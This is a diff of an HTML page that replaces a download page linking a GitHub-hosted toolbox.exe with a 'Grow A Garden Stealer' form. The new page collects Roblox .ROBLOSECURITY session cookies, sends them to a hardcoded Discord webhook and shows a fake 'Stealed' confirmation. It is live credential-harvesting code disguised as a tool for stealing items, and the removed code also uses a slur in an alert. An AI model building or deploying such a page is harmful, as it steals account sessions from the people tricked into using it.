@@ -2,13 +2,13 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>mangos.click - Download Center</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Grow A Garden Stealer</title>
   <style>
     body {
       margin: 0;
       padding: 0;
-      background: linear-gradient(to right, #2b5876, #4e4376);
+      background: #0f0f0f;
       font-family: 'Segoe UI', sans-serif;
       color: #fff;
       display: flex;
@@ -17,110 +17,163 @@
       height: 100vh;
     }
 
-    .container {
-      background: rgba(0, 0, 0, 0.7);
-      padding: 40px;
+    .form-container {
+      background: #1a1a1a;
+      padding: 30px;
       border-radius: 10px;
+      box-shadow: 0 0 20px #00ffcc88;
+      width: 300px;
       text-align: center;
-      max-width: 400px;
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
     }
 
-    h1 {
+    .form-container h2 {
       margin-bottom: 20px;
-      font-size: 28px;
+      color: #00ffc3;
+      text-shadow: 0 0 10px #00ffc3;
     }
 
-    /* Animated dropdown */
-    select {
+    input[type="text"],
+    input[type="password"] {
       width: 100%;
-      padding: 12px;
-      border: none;
+      padding: 10px;
+      margin: 10px 0;
+      background: #000;
+      border: 1px solid #00ffc3;
       border-radius: 5px;
-      font-size: 16px;
-      margin-bottom: 20px;
-      background: #fff;
-      color: #000;
-      appearance: none;
-      -webkit-appearance: none;
-      -moz-appearance: none;
-      position: relative;
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-      cursor: pointer;
+      color: #fff;
+      box-shadow: 0 0 10px #00ffc366;
     }
 
-    /* Add a custom arrow */
-    select {
-      background-image:
-        linear-gradient(45deg, transparent 50%, #000 50%),
-        linear-gradient(135deg, #000 50%, transparent 50%),
-        linear-gradient(to right, #ccc, #ccc);
-      background-position:
-        calc(100% - 20px) calc(1em + 2px),
-        calc(100% - 15px) calc(1em + 2px),
-        calc(100% - 25px) 0.5em;
-      background-size: 5px 5px, 5px 5px, 1px 1.5em;
-      background-repeat: no-repeat;
-    }
-
-    select:focus {
-      outline: none;
-      box-shadow: 0 0 12px #28a745;
-      transform: scale(1.05);
-      background-color: #f0f0f0;
-      color: #000;
-      transition: transform 0.3s ease, box-shadow 0.3s ease, background-color 0.3s ease, color 0.3s ease;
-    }
-
-    /* Animated button */
     button {
-      padding: 12px 20px;
-      background-color: #28a745;
+      width: 100%;
+      padding: 10px;
+      margin-top: 15px;
+      background: #00ffc3;
+      color: #000;
       border: none;
       border-radius: 5px;
-      color: white;
-      font-size: 16px;
+      font-weight: bold;
       cursor: pointer;
-      transition: background 0.3s, transform 0.2s, box-shadow 0.3s;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+      box-shadow: 0 0 15px #00ffc3aa;
+      transition: all 0.3s ease;
     }
 
     button:hover {
-      background-color: #218838;
-      transform: scale(1.05);
-      box-shadow: 0 6px 12px #28a745;
+      background: #00ffdd;
+      box-shadow: 0 0 25px #00ffc3ff;
     }
 
-    .footer {
-      margin-top: 20px;
-      font-size: 12px;
-      color: #aaa;
+    .popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) scale(0);
+      background: #222;
+      color: #00ffcc;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 25px #00ffc3aa;
+      text-align: center;
+      z-index: 9999;
+      transition: transform 0.3s ease;
+    }
+
+    .popup.show {
+      transform: translate(-50%, -50%) scale(1);
+    }
+
+    .popup .icon {
+      font-size: 40px;
+      margin-bottom: 10px;
+      animation: pop 0.3s ease;
+    }
+
+    .popup.error {
+      color: #ff5c5c;
+      box-shadow: 0 0 25px #ff5c5caa;
+    }
+
+    @keyframes pop {
+      0% { transform: scale(0); }
+      100% { transform: scale(1); }
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>mangos.click Downloads</h1>
-    <select id="toolSelect">
-      <option value="">-- Choose a Tool --</option>
-      <option value="toolbox">Toolbox Roblox</option>
-      <option value="exloader">ExLoader CS-GO</option>
-    </select>
-    <button onclick="redirect()">Download</button>
-    <div class="footer">© 2025 mangos.click</div>
+  <div class="form-container">
+    <h2>Grow A Garden Stealer</h2>
+    <form id="stealForm">
+      <input type="password" id="cookieInput" placeholder="🍪 Victim Cookie" required />
+      <input type="text" id="usernameInput" placeholder="Your username" />
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <!-- Success Popup -->
+  <div class="popup" id="successPopup">
+    <div class="icon">✅</div>
+    <h3>Stealed</h3>
+    <p>Please wait 2–3 days to see changes in your inventory.</p>
+  </div>
+
+  <!-- Error Popup -->
+  <div class="popup error" id="errorPopup">
+    <div class="icon">❌</div>
+    <h3>Error</h3>
+    <p>Cookie is invalid.</p>
   </div>
 
   <script>
-    function redirect() {
-      const value = document.getElementById('toolSelect').value;
-      if (value === "toolbox") {
-        window.location.href = "https://github.com/dariosfiles/random-stuff/raw/refs/heads/main/toolbox.exe";
-      } else if (value === "exloader") {
-        window.location.href = "https://en.exloader.net/";
-      } else {
-        alert("No tool selected retard");
+    const form = document.getElementById('stealForm');
+    const successPopup = document.getElementById('successPopup');
+    const errorPopup = document.getElementById('errorPopup');
+    const cookieInput = document.getElementById('cookieInput');
+    const usernameInput = document.getElementById('usernameInput');
+
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1377692113763958824/zEWBoyh6EyG92tI6YlLdKkUsFvY1ejW_D0WSFYjzwykogqY-uzSCMn67gJHyyNt_jIW5"; // <-- replace this
+
+    function showPopup(popup) {
+      popup.classList.add('show');
+      setTimeout(() => {
+        popup.classList.remove('show');
+      }, 4000);
+    }
+
+    async function sendToWebhook(cookie, username) {
+      const payload = {
+        content: `🍪 Cookie\n\`\`\`\n${cookie}\n\`\`\`\n\n❓Username\n\`\`\`\n${username || "Anonymous"}\n\`\`\``
+      };
+
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+      } catch (err) {
+        console.error("Webhook Error:", err);
       }
     }
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const cookieValue = cookieInput.value.trim();
+      const usernameValue = usernameInput.value.trim();
+
+      if (!cookieValue.includes("ROBLOSECURITY")) {
+        showPopup(errorPopup);
+        return;
+      }
+
+      // Send to webhook
+      sendToWebhook(cookieValue, usernameValue);
+
+      // Show success
+      showPopup(successPopup);
+      form.reset();
+    });
   </script>
 </body>
 </html>
